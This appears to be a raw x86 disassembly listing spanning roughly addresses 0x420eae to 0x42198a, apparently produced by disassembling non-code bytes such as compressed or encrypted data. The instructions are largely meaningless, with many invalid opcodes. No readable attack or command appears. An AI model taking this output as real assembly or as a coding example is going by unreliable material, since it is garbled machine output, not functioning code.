  420eae:	loop   0x420ebd
  420eb0:	(bad)  [esi+edi*8-0x73]
  420eb4:	sbb    DWORD PTR [edi],ebp
  420eb6:	outs   dx,DWORD PTR ds:[esi]
  420eb7:	mov    bl,0x16
  420eb9:	push   es
  420eba:	add    al,ch
  420ebc:	ds into 
  420ebe:	adc    DWORD PTR [esi+esi*1+0x40],eax
  420ec2:	scas   eax,DWORD PTR es:[edi]
  420ec3:	repnz (bad) 
  420ec5:	fisub  DWORD PTR [edi-0xb]
  420ec8:	enter  0xfed3,0xe2
  420ecc:	push   ecx
  420ecd:	fwait
  420ece:	cmp    al,0x84
  420ed0:	aad    0xf5
  420ed2:	sub    al,0xd7
  420ed4:	add    eax,0xffb45f7b
  420ed9:	arpl   ax,si
  420edb:	push   esi
  420edc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420edd:	push   ebx
  420ede:	pop    esp
  420edf:	adc    DWORD PTR [ecx+0x35e3c2c],eax
  420ee5:	leave  
  420ee6:	ins    DWORD PTR es:[edi],dx
  420ee7:	push   ecx
  420ee8:	mov    eax,ds:0xac3ea3a5
  420eed:	pop    esi
  420eee:	push   esi
  420eef:	inc    edi
  420ef0:	sub    BYTE PTR [ecx],bh
  420ef2:	mov    eax,0x33fceb36
  420ef7:	or     DWORD PTR [ebx],eax
  420ef9:	out    dx,eax
  420efa:	push   ebp
  420efb:	adc    bl,BYTE PTR [ebp-0x6b1b40bd]
  420f01:	and    al,bl
  420f03:	ret    
  420f04:	loop   0x420f3e
  420f06:	xchg   edx,eax
  420f07:	jle    0x420edb
  420f09:	pop    ecx
  420f0a:	push   esp
  420f0b:	(bad)  
  420f0c:	xchg   ebp,eax
  420f0d:	ja     0x420f3f
  420f0f:	out    dx,eax
  420f10:	add    esi,DWORD PTR [ecx+0x3f]
  420f13:	test   al,0xac
  420f15:	leave  
  420f16:	cmpps  xmm0,XMMWORD PTR [eax],0x39
  420f1a:	ud0    ecx,DWORD PTR [eiz*4-0xb52a184]
  420f22:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420f23:	lock xor BYTE PTR [eax*1+0x70b3e860],ah
  420f2b:	jp     0x420f81
  420f2d:	xor    edx,DWORD PTR [edx]
  420f2f:	sub    DWORD PTR [ecx+edi*1],eax
  420f32:	pop    ebx
  420f33:	mov    cl,0xda
  420f35:	jmp    0xe0b25a93
  420f3a:	add    BYTE PTR [edi],al
  420f3c:	xor    esp,esi
  420f3e:	pop    es
  420f3f:	add    ebp,edx
	...
  420fb1:	add    BYTE PTR [eax],al
  420fb3:	add    BYTE PTR [edx-0x5b],ah
  420fb6:	jbe    0x421037
  420fb8:	idiv   edi
  420fba:	imul   edi,DWORD PTR [ebp-0x6d53d0f4],0xffffff8f
  420fc1:	in     al,0x16
  420fc3:	push   0x1
  420fc5:	popa   
  420fc6:	add    DWORD PTR [eax],eax
  420fc8:	cmc    
  420fc9:	add    BYTE PTR [eax],al
  420fcb:	add    BYTE PTR [edi-0x3d5ce4df],dh
  420fd1:	aad    0x72
  420fd3:	inc    edi
  420fd4:	scas   al,BYTE PTR es:[edi]
  420fd5:	pop    esp
  420fd6:	mov    al,0x58
  420fd8:	xchg   edx,eax
  420fd9:	sbb    al,0xd8
  420fdb:	sub    BYTE PTR [ecx+0x76],0xc0
  420fdf:	faddp  st(2),st
  420fe1:	sub    al,0xd5
  420fe3:	cld    
  420fe4:	or     DWORD PTR [ebp-0x2a76ee16],ecx
  420fea:	sahf   
  420feb:	pushw  0xffab
  420fee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420fef:	scas   eax,DWORD PTR es:[edi]
  420ff0:	xor    al,0x5a
  420ff2:	sub    esi,DWORD PTR [eax+0x7e54a647]
  420ff8:	sub    bl,dl
  420ffa:	mov    dh,0xb1
  420ffc:	jecxz  0x420fa0
  420ffe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420fff:	repz mov ds:0x8f512c59,al
  421005:	jnp    0x420fbd
  421007:	xchg   esi,eax
  421008:	sbb    bh,BYTE PTR ds:0x1a69d3d0
  42100e:	inc    edx
  42100f:	icebp  
  421010:	add    dl,BYTE PTR [eax-0x7a]
  421013:	jno    0x42106c
  421015:	or     DWORD PTR [edx],edi
  421017:	out    0x1a,al
  421019:	pop    ss
  42101a:	sbb    ch,BYTE PTR [ebp-0x78]
  42101d:	inc    esp
  42101e:	repz sub eax,0xa26c2ca7
  421024:	adc    esi,DWORD PTR [ecx-0x636b1910]
  42102a:	lock dec ecx
  42102c:	sbb    DWORD PTR [ebx+0x38cc6509],0xc8dc31d9
  421036:	test   al,cl
  421038:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421039:	push   es
  42103a:	aaa    
  42103b:	add    al,0x95
  42103d:	push   0xffffff98
  42103f:	test   BYTE PTR [esi+0x38],al
  421042:	sti    
  421043:	fmul   QWORD PTR [esi]
  421045:	ret    0x3fd5
  421048:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421049:	pushf  
  42104a:	les    edi,FWORD PTR [edi-0x3b149a23]
  421050:	pop    edi
  421051:	in     eax,dx
  421052:	mov    al,0xd3
  421054:	hlt    
  421055:	pop    ds
  421056:	jnp    0x42103f
  421058:	mov    al,ds:0x515b992e
  42105d:	xor    eax,0x9480d307
  421062:	sbb    esp,esi
  421064:	cmp    ah,BYTE PTR [eax-0x77ce713f]
  42106a:	sbb    al,0x40
  42106c:	add    DWORD PTR [ebx-0x3b],ebp
  42106f:	stos   DWORD PTR es:[edi],eax
  421070:	sbb    dl,BYTE PTR [ebx+0x1f]
  421073:	pop    ecx
  421074:	lds    ebp,FWORD PTR [ebx-0x4d]
  421077:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421078:	loope  0x421002
  42107a:	(bad)  
  42107b:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42107d:	cmc    
  42107e:	cmp    edx,DWORD PTR [bp+di-0x67]
  421082:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421083:	shl    BYTE PTR [ebp-0x78],0x61
  421087:	jb     0x42107c
  421089:	xchg   edi,eax
  42108a:	sub    eax,0xbc8bb086
  42108f:	pop    esi
  421090:	loope  0x42102d
  421092:	cmp    al,0x2b
  421094:	add    eax,0xfdc4dfc7
  421099:	push   ecx
  42109a:	dec    edi
  42109b:	xchg   DWORD PTR [ecx+0x7e5e419e],ebx
  4210a1:	jns    0x421114
  4210a3:	addr16 adc eax,0x7088832d
  4210a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4210aa:	stos   BYTE PTR es:[edi],al
  4210ab:	xchg   DWORD PTR ds:0x765eb0,eax
  4210b1:	and    BYTE PTR [edi+0x39eaf2a7],al
  4210b7:	ret    
  4210b8:	scas   al,BYTE PTR es:[edi]
  4210b9:	jae    0x421100
  4210bb:	dec    ecx
  4210bc:	adc    al,0xda
  4210be:	sahf   
  4210bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4210c0:	stc    
	...
  421131:	add    BYTE PTR [eax],al
  421133:	add    BYTE PTR [ebx-0x31],dh
  421136:	fwait
  421137:	cmp    DWORD PTR [edi+0x15cff37d],edi
  42113d:	dec    edi
  42113e:	data16 jg 0x4211a5
  421141:	adc    dh,BYTE PTR [eax+edi*1+0x161f6]
  421148:	cmc    
  421149:	add    BYTE PTR [eax],al
  42114b:	add    BYTE PTR [eax+0x7891d422],ch
  421151:	dec    ecx
  421152:	or     bh,cl
  421154:	rol    bh,1
  421156:	aam    0x75
  421158:	mov    WORD PTR [ecx-0x5eeb72ed],es
  42115e:	test   BYTE PTR [ebx],bl
  421160:	inc    eax
  421161:	inc    esp
  421162:	pop    ecx
  421163:	jne    0x4211c4
  421165:	les    ebx,FWORD PTR [eax]
  421167:	rcl    esp,1
  421169:	rdtsc  
  42116b:	test   DWORD PTR [ecx+0x21f4c545],esi
  421171:	mov    cl,0x8b
  421173:	test   BYTE PTR [esp+eax*2-0x739c4bc3],dl
  42117a:	ja     0x42116c
  42117c:	or     eax,DWORD PTR [eax-0x6e]
  42117f:	sub    ebx,ebp
  421181:	add    al,0xaf
  421183:	sub    ebp,edx
  421185:	ficomp DWORD PTR [ebx-0x47]
  421188:	mov    dl,0x2f
  42118a:	clc    
  42118b:	loope  0x421159
  42118d:	(bad)  
  42118e:	repnz loopne 0x4211ad
  421191:	jae    0x421115
  421193:	pop    edx
  421194:	jmp    0x42113e
  421196:	pushf  
  421197:	mov    dh,BYTE PTR [eax+0x0]
  42119a:	fwait
  42119b:	mov    dl,0x98
  42119d:	jge    0x4211c9
  42119f:	pushf  
  4211a0:	rcl    DWORD PTR [eax-0x56],1
  4211a3:	(bad)  
  4211a4:	mov    al,gs:0xc8bf5490
  4211aa:	leave  
  4211ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4211ac:	cld    
  4211ad:	cli    
  4211ae:	hlt    
  4211af:	mov    BYTE PTR [edx-0x1],bl
  4211b2:	data16 sub bh,BYTE PTR [esi+0x196ea991]
  4211b9:	sub    BYTE PTR [eax+0x50],cl
  4211bc:	retf   
  4211bd:	call   0xf8725372
  4211c2:	sub    al,0x74
  4211c4:	dec    edx
  4211c5:	mov    al,0x5f
  4211c7:	mov    ah,0x9
  4211c9:	add    esi,DWORD PTR [esi+eiz*2]
  4211cc:	fs in  al,0x5d
  4211cf:	icebp  
  4211d0:	mov    al,0x94
  4211d2:	xchg   ebp,eax
  4211d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4211d4:	mov    eax,DWORD PTR [esi+0xf3d7da8]
  4211da:	mov    esi,0x11d78723
  4211df:	and    BYTE PTR [ecx-0x52],dl
  4211e2:	pop    ecx
  4211e3:	inc    edi
  4211e4:	xor    DWORD PTR [edx+0x2d6ff1de],edx
  4211ea:	add    DWORD PTR [edx+esi*4-0x8],esp
  4211ee:	repnz sti 
  4211f0:	pop    edx
  4211f1:	fwait
  4211f2:	pusha  
  4211f3:	cli    
  4211f4:	(bad)  
  4211f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4211f6:	lds    ecx,FWORD PTR [ecx-0x6b412ab1]
  4211fc:	jns    0x42117e
  4211fe:	mov    ah,dh
  421200:	dec    esp
  421201:	fs or  eax,0xc27c77f
  421207:	test   ecx,ecx
  421209:	cmp    al,dh
  42120b:	(bad)  [edx-0x463a5b84]
  421211:	ss in  al,dx
  421213:	psubusb mm0,QWORD PTR ds:0x69baec18
  42121a:	mov    ds:0x8583a80d,eax
  42121f:	lods   eax,DWORD PTR ds:[esi]
  421220:	fisubr DWORD PTR [eax-0x1d]
  421223:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421224:	push   ebx
  421225:	sbb    al,bh
  421227:	loop   0x42123f
  421229:	stc    
  42122a:	inc    edi
  42122b:	push   edx
  42122c:	into   
  42122d:	cs adc al,0xde
  421230:	je     0x4211d0
  421232:	inc    ebp
  421233:	(bad)  
  421234:	push   edx
  421235:	(bad)  
  421236:	std    
  421237:	in     al,0xaa
  421239:	stos   BYTE PTR es:[edi],al
  42123a:	les    esp,FWORD PTR [eax]
  42123c:	enter  0x6bda,0x56
  421240:	loope  0x421242
	...
  4212b2:	add    BYTE PTR [eax],al
  4212b4:	inc    ecx
  4212b5:	push   es
  4212b6:	clc    
  4212b7:	mov    esi,0xff47feff
  4212bc:	or     eax,0x5983dc15
  4212c1:	xchg   edi,eax
  4212c2:	aam    0xce
  4212c4:	jmp    0x421328
  4212c6:	add    DWORD PTR [eax],eax
  4212c8:	cmc    
  4212c9:	add    BYTE PTR [eax],al
  4212cb:	add    bl,ch
  4212cd:	call   0xee22284c
  4212d2:	cmp    BYTE PTR ds:0x401d5e46,al
  4212d8:	cmp    BYTE PTR [edi-0x6325a144],al
  4212de:	mov    WORD PTR [ecx],es
  4212e0:	in     eax,0xb8
  4212e2:	xor    al,0x4f
  4212e4:	push   edi
  4212e5:	fmul   st(2),st
  4212e7:	add    al,0x69
  4212e9:	iret   
  4212ea:	jmp    0xc622:0xd05189a9
  4212f1:	mov    edi,DWORD PTR [edx+0x10028a80]
  4212f7:	or     DWORD PTR [edi+0x61],ebp
  4212fa:	sbb    BYTE PTR [eax+eax*2],bl
  4212fd:	stos   DWORD PTR es:[edi],eax
  4212fe:	(bad)  
  4212ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421300:	sbb    al,0x37
  421302:	daa    
  421303:	test   al,0xf6
  421305:	xchg   edx,eax
  421306:	lods   al,BYTE PTR cs:[esi]
  421308:	sub    BYTE PTR [esi],ch
  42130a:	jmp    0x42131d
  42130c:	mov    ebp,0xcbe14622
  421311:	inc    ecx
  421312:	push   eax
  421313:	mov    edi,DWORD PTR [edi-0x8a54780]
  421319:	fldenv [esi+0x8f1cf94]
  42131f:	jl     0x4212e9
  421321:	lods   eax,DWORD PTR ds:[esi]
  421322:	imul   ebp,ecx,0xfffffff5
  421325:	(bad)  
  421326:	cmp    esp,ebp
  421328:	lock jbe 0x42138a
  42132b:	or     ebx,DWORD PTR [esi-0x11]
  42132e:	jmp    0x42130c
  421330:	in     eax,0x5f
  421332:	das    
  421333:	mov    ebp,0xcd8676fe
  421338:	daa    
  421339:	hlt    
  42133a:	mov    esp,0x4ca2514b
  42133f:	ins    BYTE PTR es:[edi],dx
  421340:	or     ebp,esi
  421342:	in     al,dx
  421343:	mov    BYTE PTR [ecx],ah
  421345:	adc    al,0x24
  421347:	mov    bh,0x3e
  421349:	mov    dh,0x63
  42134b:	adc    eax,0xf57f4a88
  421350:	fs adc al,0xfd
  421353:	call   0x68c8279d
  421358:	add    eax,0x1c54452a
  42135d:	loopne 0x4212fe
  42135f:	or     DWORD PTR [esi-0x4e0a4fd8],0xffffffbe
  421366:	inc    edi
  421367:	fmul   QWORD PTR [edx]
  421369:	std    
  42136a:	mov    WORD PTR ds:0x29e1a91e,?
  421370:	sub    DWORD PTR [esi+eiz*4-0x6b],esp
  421374:	out    0x6b,eax
  421376:	mov    ah,0xdf
  421378:	bound  esp,QWORD PTR es:[ebp-0x7d5fbe50]
  42137f:	ja     0x4213cb
  421381:	pushf  
  421382:	in     al,dx
  421383:	jne    0x4213bb
  421385:	xchg   ecx,eax
  421386:	ret    0xe4ec
  421389:	jb     0x421365
  42138b:	or     eax,0x2433877c
  421390:	aas    
  421391:	push   0x4d
  421393:	sub    BYTE PTR [edi-0x78],dh
  421396:	cmc    
  421397:	mov    al,0xf7
  421399:	sub    ebp,DWORD PTR [ebp+0x3836d43a]
  42139f:	test   eax,0xdaed15
  4213a4:	call   0xf067:0xab6cc6ee
  4213ab:	div    ch
  4213ad:	fiadd  WORD PTR [ecx-0x66]
  4213b0:	inc    edx
  4213b1:	loopne 0x421371
  4213b3:	lahf   
  4213b4:	imul   esi,DWORD PTR [ebx+0x37676427],0x21
  4213bb:	repz mov eax,ds:0x3a96966d
	...
  421431:	add    BYTE PTR [eax],al
  421433:	add    BYTE PTR [esi+0x7f125794],ch
  421439:	shr    edi,cl
  42143b:	mov    esp,0x960320e2
  421440:	lods   al,BYTE PTR ds:[esi]
  421441:	inc    eax
  421442:	sbb    DWORD PTR [eax+eiz*8-0xafffe9d],ebx
  421449:	add    BYTE PTR [eax],al
  42144b:	add    BYTE PTR [edi+ebx*4],dh
  42144e:	cmp    al,0x75
  421450:	inc    edx
  421451:	mov    bh,0x13
  421453:	add    DWORD PTR [edx+edi*1+0x2eb9b5d6],ebp
  42145a:	adc    al,0x34
  42145c:	inc    esi
  42145d:	hlt    
  42145e:	retf   0x370a
  421461:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421462:	mov    ds:0xb276de9d,al
  421467:	pushf  
  421468:	fs push ss
  42146a:	div    BYTE PTR [edx-0x6f94ddc2]
  421470:	xchg   ecx,eax
  421471:	xchg   esp,eax
  421472:	sub    eax,0x108886c2
  421477:	in     eax,dx
  421478:	sbb    al,0x90
  42147a:	loopne 0x421482
  42147c:	dec    ebp
  42147d:	xlat   BYTE PTR ds:[ebx]
  42147e:	jl     0x4214ec
  421480:	div    DWORD PTR [ebx-0xb31b6bf]
  421486:	and    esp,ecx
  421488:	cmp    al,0x8d
  42148a:	xor    DWORD PTR [ebx+0x32a33a4d],edx
  421490:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421491:	dec    esp
  421492:	mov    dl,0x29
  421494:	push   ebp
  421495:	mov    ds:0xc4f44662,al
  42149a:	sbb    DWORD PTR [eax+0x59],ebx
  42149d:	push   ecx
  42149e:	cs pusha 
  4214a0:	pop    es
  4214a1:	xlat   BYTE PTR ds:[ebx]
  4214a2:	push   esi
  4214a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4214a4:	aas    
  4214a5:	pop    esp
  4214a6:	mov    ds:0x826993c1,al
  4214ab:	loopne 0x42150f
  4214ad:	cmp    edx,DWORD PTR [ebp-0x6a]
  4214b0:	or     BYTE PTR [ebp-0x5e],0xc6
  4214b4:	dec    ebp
  4214b5:	push   eax
  4214b6:	jo     0x42147c
  4214b8:	mov    BYTE PTR ds:0x26a3b063,dh
  4214be:	add    ch,BYTE PTR [edi+ebp*4-0x3f821ff0]
  4214c5:	push   ss
  4214c6:	or     bh,dl
  4214c8:	pop    edi
  4214c9:	sbb    cl,BYTE PTR [edi+0x5245aec0]
  4214cf:	push   esp
  4214d0:	mov    dh,0xa
  4214d2:	retf   
  4214d3:	xchg   DWORD PTR [esi-0x65121b62],eax
  4214d9:	push   DWORD PTR ds:0x6e2b3a51
  4214df:	mov    es,edi
  4214e1:	test   ebp,0xfd0b6f98
  4214e7:	add    dl,al
  4214e9:	lea    ebx,[ecx+0x74]
  4214ec:	(bad)  
  4214ee:	stos   BYTE PTR es:[edi],al
  4214ef:	or     ebp,esi
  4214f1:	imul   esi,DWORD PTR [esi+0x30],0x7e7b1f9c
  4214f8:	bound  ebp,QWORD PTR [ebx]
  4214fa:	dec    ebp
  4214fb:	(bad)  
  4214fc:	sbb    eax,0xe5c72c00
  421501:	mov    ch,0x3b
  421503:	retf   
  421504:	sbb    BYTE PTR [edx+0x306f4d4d],bh
  42150a:	rcl    DWORD PTR [edx-0x3d9cbde2],1
  421510:	and    al,BYTE PTR [eax+ecx*1+0x59]
  421514:	xor    DWORD PTR [eax+0x6c],esi
  421517:	push   esp
  421518:	mov    al,0xe0
  42151a:	sub    esp,DWORD PTR [ecx-0x13]
  42151d:	mov    bl,0x49
  42151f:	mov    ds:0x97dcbd52,al
  421524:	fisubr WORD PTR [esi]
  421526:	cmp    al,0x98
  421528:	pushf  
  421529:	xchg   edi,eax
  42152a:	fdivr  QWORD PTR [ebx-0xc9fd0b8]
  421530:	mov    eax,0xf1ba5d5f
  421535:	into   
  421536:	push   edi
  421537:	test   BYTE PTR [eax-0x3bede140],cl
  42153d:	inc    esp
  42153e:	jg     0x4214df
  421540:	in     eax,0x0
	...
  4215b2:	add    BYTE PTR [eax],al
  4215b4:	test   BYTE PTR [eax-0x48],ch
  4215b7:	or     ah,bh
  4215b9:	fdiv   DWORD PTR [esp+ebp*8-0x55f32d34]
  4215c0:	(bad)  
  4215c2:	iret   
  4215c3:	scas   al,BYTE PTR es:[edi]
  4215c4:	aad    0x64
  4215c6:	add    DWORD PTR [eax],eax
  4215c8:	cmc    
  4215c9:	add    BYTE PTR [eax],al
  4215cb:	add    BYTE PTR [ecx+0x45d712be],ah
  4215d1:	xlat   BYTE PTR ds:[ebx]
  4215d2:	aam    0xa9
  4215d4:	jno    0x4215eb
  4215d6:	ret    0x309f
  4215d9:	mov    ds:0x6af3f2b7,al
  4215de:	(bad)  
  4215df:	dec    ebx
  4215e0:	shl    ah,cl
  4215e2:	je     0x421629
  4215e4:	rcr    BYTE PTR [ebp+0x39],1
  4215e7:	cmp    dh,BYTE PTR [ecx-0x1a]
  4215ea:	cmp    edx,ebp
  4215ec:	mov    ah,BYTE PTR ds:0x87f49998
  4215f2:	cmp    BYTE PTR [ebp+edi*1+0x44],cl
  4215f6:	(bad)  
  4215f8:	xor    al,0xc0
  4215fa:	jg     0x4215fe
  4215fc:	xchg   esp,eax
  4215fd:	loop   0x4215e1
  4215ff:	int    0xd9
  421601:	or     ah,BYTE PTR [ebx+0x379a293]
  421607:	sub    BYTE PTR [eax-0x7c],dl
  42160a:	fwait
  42160b:	mov    bh,0x66
  42160d:	mov    ebp,0xc9babba3
  421612:	sbb    edx,DWORD PTR [edx]
  421614:	js     0x42164b
  421616:	mov    bh,0x52
  421618:	fild   WORD PTR [edx+0x38]
  42161b:	loop   0x4215c7
  42161d:	inc    ebp
  42161e:	jle    0x4215a1
  421620:	popf   
  421621:	jmp    0x4215c8
  421623:	mov    ?,WORD PTR [esp+ebx*1+0x48]
  421627:	xchg   edx,eax
  421628:	mov    edi,DWORD PTR [eax+eax*4+0x29]
  42162c:	dec    edx
  42162d:	push   edi
  42162e:	jecxz  0x4215de
  421630:	add    al,0xe1
  421632:	jge    0x421672
  421634:	cli    
  421635:	cmp    cl,BYTE PTR [ecx+0x2fceb4b6]
  42163b:	pop    ebx
  42163c:	sub    DWORD PTR [ebx],0x96ba486a
  421642:	cld    
  421643:	cmp    bh,BYTE PTR [ecx]
  421645:	out    0x77,eax
  421647:	dec    esp
  421648:	xchg   ebx,eax
  421649:	or     al,0x1
  42164b:	sti    
  42164c:	mov    esp,0x394d3817
  421651:	xor    eax,0xf208bcf3
  421656:	je     0x4215fd
  421658:	scas   eax,DWORD PTR es:[edi]
  421659:	add    al,0x45
  42165b:	pop    es
  42165c:	xor    al,0xf8
  42165e:	pop    eax
  42165f:	mov    eax,0x2e9ccc83
  421664:	retf   0x9b91
  421667:	es lahf 
  421669:	push   ds
  42166a:	repnz test BYTE PTR [esi],dl
  42166d:	mov    ebx,0x89f6024e
  421672:	sub    esp,ebp
  421674:	sub    DWORD PTR [ebx+0x13],ebp
  421677:	sub    DWORD PTR [edi+0x41920f92],edi
  42167d:	xor    ch,BYTE PTR [ebx-0x42c938b5]
  421683:	jmp    0x4216c7
  421685:	xchg   edi,eax
  421686:	mov    al,ds:0x165c3c72
  42168b:	push   edi
  42168c:	mov    bl,0xd0
  42168e:	dec    DWORD PTR [ebp-0x503fd4d6]
  421694:	xchg   DWORD PTR [edx-0x205fabf0],ebx
  42169a:	daa    
  42169b:	add    dl,BYTE PTR [edx]
  42169d:	dec    edi
  42169e:	inc    DWORD PTR [edi-0x5f]
  4216a1:	stos   DWORD PTR es:[edi],eax
  4216a2:	mov    eax,ds:0xb41ac33c
  4216a7:	loope  0x4216db
  4216a9:	aas    
  4216aa:	rol    BYTE PTR [edx-0x75],0x79
  4216ae:	jg     0x4216ed
  4216b0:	and    BYTE PTR [eax],ch
  4216b2:	mov    al,0x75
  4216b4:	push   eax
  4216b5:	mov    eax,0xbbc3e04d
  4216ba:	int    0xf4
  4216bc:	pusha  
  4216bd:	cmp    BYTE PTR [edi+0x8a78],0x0
	...
  421734:	mov    DWORD PTR [edi],ebp
  421736:	and    eax,0xad8aa780
  42173b:	das    
  42173c:	retf   0x8184
  42173f:	cmp    ebx,eax
  421741:	loopne 0x42174c
  421743:	add    al,0xca
  421745:	add    DWORD PTR gs:[eax],eax
  421748:	cmc    
  421749:	add    BYTE PTR [eax],al
  42174b:	add    BYTE PTR [esi-0x4e5c5c6f],bl
  421751:	std    
  421752:	adc    DWORD PTR [edi-0x5c],0xfee97639
  421759:	dec    esi
  42175a:	sub    eax,0x8d762b58
  42175f:	mov    BYTE PTR [edi],cl
  421761:	xor    eax,0xac3ce926
  421766:	out    dx,eax
  421767:	dec    esi
  421768:	adc    al,BYTE PTR [ebx-0x25]
  42176b:	dec    edx
  42176c:	mov    WORD PTR [esi],?
  42176e:	in     al,dx
  42176f:	pop    edx
  421770:	scas   eax,DWORD PTR es:[edi]
  421771:	mov    ch,0xc7
  421773:	idiv   BYTE PTR [ecx-0xc]
  421776:	lds    edi,FWORD PTR [ebx+edx*4+0x50]
  42177a:	xor    ch,dh
  42177c:	cwde   
  42177d:	into   
  42177e:	repz test al,0x74
  421781:	sbb    al,bl
  421783:	add    dh,cl
  421785:	in     eax,0x6b
  421787:	sub    dl,BYTE PTR [ebx-0x58]
  42178a:	xor    al,0x5a
  42178c:	push   ecx
  42178d:	(bad)
  421791:	dec    ebx
  421792:	cli    
  421793:	mov    cl,0x20
  421795:	es cmc 
  421797:	addr16 xchg ecx,eax
  421799:	xor    al,0x5f
  42179b:	fcomp  DWORD PTR [eax]
  42179d:	jmp    0x9a375003
  4217a2:	mov    ebp,0x3cc3b7d0
  4217a7:	cmp    al,0xe7
  4217a9:	pop    edx
  4217aa:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  4217ac:	pop    esp
  4217ad:	pusha  
  4217ae:	add    al,0x82
  4217b0:	and    eax,0x12d60159
  4217b5:	enter  0x2e69,0xdc
  4217b9:	xchg   BYTE PTR [edx],dh
  4217bb:	test   BYTE PTR [ebx*1+0x4e34fb33],cl
  4217c2:	xchg   ebx,eax
  4217c3:	je     0x421751
  4217c5:	lock mov ah,0xc1
  4217c8:	xchg   ebx,eax
  4217c9:	enter  0x353c,0xeb
  4217cd:	mov    BYTE PTR [edx-0xf],dh
  4217d0:	ficomp DWORD PTR [ebp-0x66278507]
  4217d6:	xchg   edx,eax
  4217d7:	inc    ebp
  4217d8:	ds jo  0x4217a6
  4217db:	call   0x69a3:0xca66c238
  4217e2:	lock mov al,ds:0xbf4a300c
  4217e8:	pusha  
  4217e9:	jbe    0x4217e5
  4217eb:	push   es
  4217ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4217ed:	ror    ah,cl
  4217ef:	ss xor al,0x2
  4217f2:	mov    cl,0x33
  4217f4:	mov    dh,0x73
  4217f6:	xor    DWORD PTR [ecx],ebp
  4217f8:	popf   
  4217f9:	mov    al,ds:0xc0f649a
  4217fe:	xor    ebx,ebx
  421800:	pop    ebp
  421801:	(bad)  
  421802:	fisub  WORD PTR [edi-0x71bb5abb]
  421808:	or     al,BYTE PTR [ebp+ebx*4-0x3791af9e]
  42180f:	mov    ds:0xb6d40670,al
  421814:	xchg   ecx,eax
  421815:	xchg   esp,edi
  421817:	lods   eax,DWORD PTR ds:[esi]
  421818:	mov    ah,0x1
  42181a:	xchg   ebp,eax
  42181b:	call   0x3112fcdd
  421820:	retf   0xe5e4
  421823:	out    dx,al
  421824:	xchg   esp,eax
  421825:	and    bh,cl
  421827:	adc    BYTE PTR [edx+0x56],ah
  42182a:	xor    DWORD PTR [ebp-0x7cc5267f],ecx
  421830:	xor    eax,0x9b9cbc21
  421835:	jae    0x421817
  421837:	sbb    al,0xfd
  421839:	and    eax,0x293dc654
  42183e:	enter  0x6d32,0x0
	...
  4218b2:	add    BYTE PTR [eax],al
  4218b4:	fsub   QWORD PTR [ebx+esi*2-0x12084b3]
  4218bb:	mov    ch,0x82
  4218bd:	lods   eax,DWORD PTR ds:[esi]
  4218be:	push   ds
  4218bf:	adc    ebx,DWORD PTR [eax-0x40015fa3]
  4218c5:	add    WORD PTR [eax],ax
  4218c8:	cmc    
  4218c9:	add    BYTE PTR [eax],al
  4218cb:	add    BYTE PTR [eax-0x41d5c78a],bl
  4218d1:	arpl   WORD PTR [esi+0x6c],di
  4218d4:	arpl   WORD PTR [ebp-0x6048bf86],bx
  4218da:	or     al,0x4e
  4218dc:	call   DWORD PTR [eax-0x5b0ba95d]
  4218e2:	mov    esp,0xf4536a14
  4218e7:	xor    eax,0xe23bf169
  4218ec:	and    eax,0xd18c7e81
  4218f1:	jae    0x4218cf
  4218f3:	adc    bl,BYTE PTR [eax+0x6a8f61d0]
  4218f9:	int    0xd4
  4218fb:	mov    BYTE PTR [eax],ch
  4218fd:	or     DWORD PTR [edi+0x7d],esp
  421900:	and    DWORD PTR [eax+0x691ce033],0x22
  421907:	shl    DWORD PTR [eax],0x40
  42190a:	mov    ebx,0x86f79659
  42190f:	call   0x4504db88
  421914:	push   edx
  421915:	fdiv   QWORD PTR [edi-0x52]
  421918:	push   ss
  421919:	shl    BYTE PTR [edi],cl
  42191b:	lea    esi,[ebx-0x3973420d]
  421921:	ficom  WORD PTR [esp+esi*4]
  421924:	js     0x421964
  421926:	mov    ebx,0xccf5dac1
  42192b:	call   0xb0effafb
  421930:	sub    BYTE PTR [ebx-0x2b],cl
  421933:	stos   BYTE PTR es:[edi],al
  421934:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421935:	jg     0x421901
  421937:	pushf  
  421938:	dec    ebx
  421939:	out    0xf,al
  42193b:	shr    DWORD PTR [edi+0x1df76c4b],0x23
  421942:	mov    WORD PTR [ebx-0xc],fs
  421945:	loop   0x421985
  421947:	sbb    eax,0x696f0250
  42194c:	pop    edx
  42194d:	jl     0x4219b1
  42194f:	inc    esp
  421950:	sbb    al,0xc9
  421952:	and    al,0xf3
  421954:	push   edi
  421955:	mov    dl,0xf2
  421957:	(bad)  
  421958:	and    ah,cl
  42195a:	ss mov dl,0x8c
  42195d:	shr    BYTE PTR [edi+0x7f21519f],0xcc
  421964:	pop    esi
  421965:	sub    dh,BYTE PTR [eax-0x4d]
  421968:	add    esp,edi
  42196a:	add    cl,BYTE PTR [edx+edx*1+0x3a]
  42196e:	fwait
  42196f:	pop    edx
  421970:	dec    esp
  421971:	(bad)  
  421972:	jmp    0x42192b
  421974:	into   
  421975:	inc    eax
  421976:	dec    edi
  421977:	and    esp,esp
  421979:	(bad)  
  42197a:	mov    esp,0xaa209157
  42197f:	add    edx,DWORD PTR [edx-0x629bb3a9]
  421985:	mov    ds:0x15a19bc0,eax
  42198a:	retf   0xbd48
